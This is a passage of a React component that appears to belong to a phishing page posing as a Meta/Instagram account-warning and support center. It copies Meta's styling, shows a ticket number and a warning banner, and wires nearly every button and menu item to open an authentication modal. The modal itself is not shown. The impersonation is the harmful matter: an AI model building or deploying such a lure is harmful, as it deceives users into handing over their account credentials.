2.33884 10.2817 2.41483 10.3384 2.513L11.1894 3.987C11.246 4.08515 11.2675 4.19961 11.2505 4.31161C11.2335 4.42361 11.179 4.52653 11.0959 4.6035ZM6.8089 3.068L7.2559 3.274C7.4234 3.3515 7.5824 3.444 7.7319 3.5495L8.1344 3.8345L9.6719 3.359L10.1234 4.141L8.9434 5.234L8.9884 5.724C9.0051 5.90762 9.0051 6.09238 8.9884 6.276L8.9434 6.766L10.1234 7.8585L9.6719 8.641L8.1344 8.1655L7.7319 8.4505C7.58199 8.55656 7.42265 8.64861 7.2559 8.7255L6.8089 8.932L6.4524 10.5H5.5489L5.1924 8.932L4.7454 8.726C4.57862 8.64895 4.41928 8.55673 4.2694 8.4505L3.8669 8.1655L2.3294 8.641L1.8774 7.8585L3.0574 6.766L3.0129 6.276C2.99622 6.09238 2.99622 5.90762 3.0129 5.724L3.0579 5.234L1.8779 4.141L2.3294 3.359L3.8669 3.8345L4.2694 3.5495C4.4189 3.4435 4.5779 3.3515 4.7454 3.2745L5.1924 3.068L5.5489 1.5H6.4524L6.8089 3.068Z" fill="black" />
                                                        </g>
                                                        <defs>
                                                            <clipPath id="clip0_4090_999">
                                                                <rect width="12" height="12" fill="white" />
                                                            </clipPath>
                                                        </defs>
                                                    </svg>
                                                </div>
                                                <div className='action-text'>
                                                    {t('menu.menu_3.title')}
                                                </div>
                                                <div className='action-arrow'>
                                                </div>
                                            </div>
                                        </div>

                                        <div className='item-action'>
                                            <div className='action-button'>
                                                <div className='action-icon'>
                                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" className="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"><path fillRule="evenodd" clipRule="evenodd" d="M12 14a4 4 0 1 0 0-8 4 4 0 0 0 0 8zm0-2a2 2 0 1 0 0-4 2 2 0 0 0 0 4z"></path><path fillRule="evenodd" clipRule="evenodd" d="M9.172 20.43a12.003 12.003 0 0 1-3.385-2.801A11.998 11.998 0 0 1 3 9.939V5.835c0-.515.28-.99.73-1.24a17.03 17.03 0 0 1 16.54 0c.45.25.73.725.73 1.24V9.94a12 12 0 0 1-6.172 10.49l-1.857 1.032a2 2 0 0 1-1.942 0l-1.857-1.032zM19 6.18a15.03 15.03 0 0 0-14 0V9.94c0 2.34.817 4.562 2.248 6.318C8.554 15.419 10.277 15 12 15c1.723 0 3.446.419 4.752 1.257A9.998 9.998 0 0 0 19 9.939V6.181zM12 17c-1.244 0-2.404.267-3.285.718.443.358.92.68 1.429.963L12 19.712l1.856-1.031a9.995 9.995 0 0 0 1.429-.963C14.405 17.267 13.245 17 12 17z"></path></svg>
                                                </div>
                                                <div className='action-text'>
                                                    {t('menu.menu_4.title')}
                                                </div>
                                                <div className='action-arrow'>
                                                </div>
                                            </div>
                                        </div>

                                        <div className='item-action'>
                                            <div className='action-button'>
                                                <div className='action-icon'>
                                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" className="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"><path fillRule="evenodd" clipRule="evenodd" d="M6.624 4.176 5.368 8.57l-.314-.055a11.057 11.057 0 0 1-1.331-.313 3.653 3.653 0 0 1-.29-.104 1 1 0 0 0-.88 1.795l.025.013-.024-.012h.001l.003.002.006.003.014.007a1.93 1.93 0 0 0 .15.064c.093.037.222.085.393.139.341.108.851.242 1.575.374C6.143 10.747 8.454 11 12 11c3.546 0 5.857-.253 7.304-.516a13.008 13.008 0 0 0 1.575-.374 4.777 4.777 0 0 0 .543-.203l.014-.007.006-.003.003-.001.001-.001-.062.029.063-.03a1 1 0 0 0-.88-1.795 3.664 3.664 0 0 1-.29.104c-.252.08-.68.195-1.33.313l-.315.055-1.256-4.395A3 3 0 0 0 14.491 2H9.51a3 3 0 0 0-2.885 2.176zM9.509 4a1 1 0 0 0-.962.725l-1.17 4.093C8.578 8.925 10.097 9 12 9c1.904 0 3.424-.075 4.622-.182l-1.17-4.093a1 1 0 0 0-.96-.725H9.508zM10.874 18A4.002 4.002 0 0 1 3 17a4 4 0 0 1 7.874-1h2.252A4.002 4.002 0 0 1 21 17a4 4 0 0 1-7.874 1h-2.252zM9 17.03a2 2 0 1 1 0-.06v.06zM17 19a2 2 0 1 0 0-4 2 2 0 0 0 0 4z"></path></svg>
                                                </div>
                                                <div className='action-text'>
                                                    {t('menu.menu_5.title')}
                                                </div>
                                                <div className='action-arrow'>
                                                </div>
                                            </div>
                                        </div>

                                        <div className={activeMenu === 1 ? "item-action active" : "item-action"} >
                                            <div className='action-button' onClick={() => handleOpendMenu(1)}>
                                                <div className='action-icon'>
                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M5.99996 6C6.22008 6.00001 6.43405 6.07265 6.60869 6.20666C6.78332 6.34067 6.90886 6.52855 6.96584 6.74118C7.02281 6.9538 7.00804 7.17929 6.9238 7.38266C6.83957 7.58603 6.69059 7.75593 6.49996 7.866V8.5C6.49996 8.63261 6.44728 8.75979 6.35351 8.85355C6.25974 8.94732 6.13256 9 5.99996 9C5.86735 9 5.74017 8.94732 5.6464 8.85355C5.55263 8.75979 5.49996 8.63261 5.49996 8.5V7.866C5.30933 7.75593 5.16034 7.58603 5.07611 7.38266C4.99188 7.17929 4.9771 6.9538 5.03408 6.74118C5.09105 6.52855 5.21659 6.34067 5.39122 6.20666C5.56586 6.07265 5.77983 6.00001 5.99996 6Z" fill="black" />
                                                        <path fillRule="evenodd" clipRule="evenodd" d="M3.5 3C3.5 2.33696 3.76339 1.70107 4.23223 1.23223C4.70107 0.763392 5.33696 0.5 6 0.5C6.66304 0.5 7.29893 0.763392 7.76777 1.23223C8.23661 1.70107 8.5 2.33696 8.5 3V4H8.9285C9.5695 4 10.137 4.409 10.2605 5.038C10.4193 5.84906 10.4995 6.67354 10.5 7.5C10.4995 8.32646 10.4193 9.15094 10.2605 9.962C10.137 10.591 9.57 11 8.9285 11H3.0715C2.4305 11 1.863 10.591 1.7395 9.962C1.58071 9.15094 1.50051 8.32646 1.5 7.5C1.5 6.508 1.618 5.654 1.7395 5.038C1.863 4.409 2.43 4 3.0715 4H3.5V3ZM7.5 3V4H4.5V3C4.5 2.60218 4.65804 2.22064 4.93934 1.93934C5.22064 1.65804 5.60218 1.5 6 1.5C6.39782 1.5 6.77936 1.65804 7.06066 1.93934C7.34196 2.22064 7.5 2.60218 7.5 3ZM3.0715 5H8.9285C9.01943 4.99797 9.10857 5.02552 9.1825 5.0785C9.236 5.1195 9.2675 5.1695 9.2795 5.231C9.391 5.7975 9.5 6.586 9.5 7.5C9.5 8.414 9.391 9.2025 9.2795 9.769C9.26788 9.83038 9.23316 9.88496 9.1825 9.9215C9.10857 9.97448 9.01943 10.002 8.9285 10H3.0715C2.98057 10.002 2.89143 9.97448 2.8175 9.9215C2.76688 9.88492 2.73217 9.83036 2.7205 9.769C2.57429 9.02151 2.50045 8.26166 2.5 7.5C2.5 6.586 2.609 5.7975 2.7205 5.231C2.73217 5.16964 2.76688 5.11508 2.8175 5.0785C2.89143 5.02552 2.98057 4.99797 3.0715 5Z" fill="black" />
                                                    </svg>
                                                </div>
                                                <div className='action-text'>
                                                    {t('menu.menu_6.title')}
                                                </div>
                                                <div className='action-arrow'>
                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                    </svg>
                                                </div>
                                            </div>
                                            <div className='content-action'>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_1')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_2')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_3')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_4')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_5')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_6')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_7')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_8')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_9')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_10')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_11')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_12')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                                <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                    <div className="action-icon">
                                                        <svg></svg>
                                                    </div>
                                                    <div className="action-text">{t('menu.menu_6.sub_title.sub_13')}</div>
                                                    <div className="action-arrow"></div>
                                                </div>
                                            </div>
                                        </div>

                                        <div className={activeMenu === 2 ? "item-action active" : "item-action"} >
                                            <div className='action-button' onClick={() => handleOpendMenu(2)}>
                                                <div className='action-icon'>
                                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" className="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"><path fillRule="evenodd" clipRule="evenodd" d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm0-13.702c.483 0 .875.391.875.875V17a.875.875 0 0 1-1.75 0v-6.827c0-.484.392-.875.875-.875zm0-1.275c.833 0 1.25-.405 1.25-1.012C13.25 6.405 12.833 6 12 6s-1.25.405-1.25 1.011c0 .607.417 1.012 1.25 1.012z"></path></svg>
                                                </div>
                                                <div className='action-text'>
                                                    {t('menu.menu_7.title')}
                                                </div>
                                                <div className='action-arrow'>
                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                    </svg>
                                                </div>
                                            </div>
                                            <div className='content-action'>
                                                <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                    <div className='action-icon'>
                                                        <svg></svg>
                                                    </div>
                                                    <div className='action-text'>
                                                        {t('menu.menu_6.sub_title.sub_1')}
                                                    </div>
                                                    <div className='action-arrow'></div>
                                                </div>
                                                <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                    <div className='action-icon'>
                                                        <svg ></svg>
                                                    </div>
                                                    <div className='action-text'>
                                                        {t('menu.menu_6.sub_title.sub_2')}
                                                    </div>
                                                    <div className='action-arrow'>
                                                        <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <path d="M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z" fill="black" />
                                                            <path d="M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z" fill="black" />
                                                        </svg>
                                                    </div>
                                                </div>
                                                <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                    <div className='action-icon'>
                                                        <svg ></svg>
                                                    </div>
                                                    <div className='action-text'>
                                                        {t('menu.menu_6.sub_title.sub_3')}
                                                    </div>
                                                    <div className='action-arrow'>
                                                    </div>
                                                </div>
                                                <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                    <div className='action-icon'>
                                                        <svg ></svg>
                                                    </div>
                                                    <div className='action-text'>
                                                        {t('menu.menu_6.sub_title.sub_4')}
                                                    </div>
                                                    <div className='action-arrow'>
                                                    </div>
                                                </div>
                                                <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                    <div className='action-icon'>
                                                        <svg ></svg>
                                                    </div>
                                                    <div className='action-text'>
                                                        {t('menu.menu_6.sub_title.sub_5')}
                                                    </div>
                                                    <div className='action-arrow'>
                                                        <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <path d="M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z" fill="black" />
                                                            <path d="M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z" fill="black" />
                                                        </svg>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        {/* LEFT CONTENT END */}

                        {/* RIGHT CONTENT START */}
                        <div className="righ col-8">
                            <div className='content-right'>
                                <div className="top-content">
                                    <h1>{t('content.top_content.title')}</h1>
                                    <p>{t('content.top_content.sub.sub_1')}</p>
                                    <p>{t('content.top_content.sub.sub_2')}</p>
                                    <p className="ticket">{t('content.top_content.ticket')} #{ticketId}</p>
                                    <p><b>{t('content.guide.title')}</b></p>
                                    <ul>
                                        <li>{t('content.guide.sub.sub_1')}</li>
                                        <li>{t('content.guide.sub.sub_2')}</li>
                                        <li>{t('content.guide.sub.sub_3')}</li>
                                    </ul>
                                </div>
                                {/* CARD */}
                                <div className='card-thumb'>
                                    <img src="/banner-v3.png" width="100%" alt='warning instagram accont' />
                                    <div className='thumb-content'>
                                        <div className="warning-list">
                                            <p>{t('content.thumb.sub.sub_1')}</p>
                                            <h1><b>{t('content.thumb.title')}</b></h1>
                                            <p>{t('content.thumb.sub.sub_2')}</p>
                                        </div>
                                        <div className='btn-wrapper' onClick={() => setOpenAuthModal(true)}>
                                            <div className='button fb-blue'><b>{t('content.thumb.button')}</b></div>
                                        </div>
                                        <div className="day" style={{ marginTop: '10px', textAlign: 'center' }}>
                                            <p>{t('content.thumb.day')} <b>{currentDate}</b>.</p>
                                        </div>
                                    </div>
                                </div>

                                <div className="card-bottom">
                                    <h6>{t('content.privacy_center.title')}</h6>
                                    <div className='item-action'>
                                        <div className='action-button b-bottom' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-icon'>
                                                <img src="/icon-women.png" alt="icon warning" />
                                            </div>
                                            <div className='action-text'>
                                                <span>{t('content.privacy_center.sub_title.sub_1.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.privacy_center.sub_title.sub_1.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                        <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-icon'>
                                                <img src="/icon-women.png" alt="icon warning" />
                                            </div>
                                            <div className='action-text'>
                                                <span>{t('content.privacy_center.sub_title.sub_2.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.privacy_center.sub_title.sub_2.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <br />

                                    <h6>{t('content.more_info.title')}</h6>
                                    <div className='item-action'>
                                        <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-icon'>
                                                <img src="/icon-docs.png" alt=" Ai" />
                                            </div>
                                            <div className='action-text'>
                                                <span>{t('content.more_info.sub_title.sub_1.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.more_info.sub_title.sub_1.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <br />

                                    <h6>{t('content.resouces.title')}</h6>
                                    <div className='item-action'>
                                        <div className='action-button b-bottom ' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-text'>
                                                <span>{t('content.resouces.sub_title.sub_1.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.resouces.sub_title.sub_1.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                        <div className='action-button b-bottom ' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-text'>
                                                <span>{t('content.resouces.sub_title.sub_2.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.resouces.sub_title.sub_2.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                        <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-text'>
                                                <span>{t('content.resouces.sub_title.sub_3.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.resouces.sub_title.sub_3.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
